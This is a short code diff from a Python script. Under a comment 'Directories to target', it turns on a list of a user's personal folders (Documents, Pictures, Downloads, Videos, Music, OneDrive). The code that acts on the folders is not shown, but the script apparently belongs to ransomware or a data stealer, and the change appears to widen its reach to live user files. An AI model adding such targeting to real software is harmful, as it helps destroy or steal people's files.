@@ -101,13 +101,13 @@ def main():
 
     # Directories to target
     user_dirs = [
-        #os.path.join(home_dir, 'Documents'),
-        #os.path.join(home_dir, 'Pictures'),
+        os.path.join(home_dir, 'Documents'),
+        os.path.join(home_dir, 'Pictures'),
         # os.path.join(home_dir, 'Desktop'),
-        #os.path.join(home_dir, 'Downloads'),
-        #os.path.join(home_dir, 'Videos'),
-        #os.path.join(home_dir, 'Music'),
-        #os.path.join(home_dir, 'OneDrive')
+        os.path.join(home_dir, 'Downloads'),
+        os.path.join(home_dir, 'Videos'),
+        os.path.join(home_dir, 'Music'),
+        os.path.join(home_dir, 'OneDrive')
     ]
 
     for directory in user_dirs:
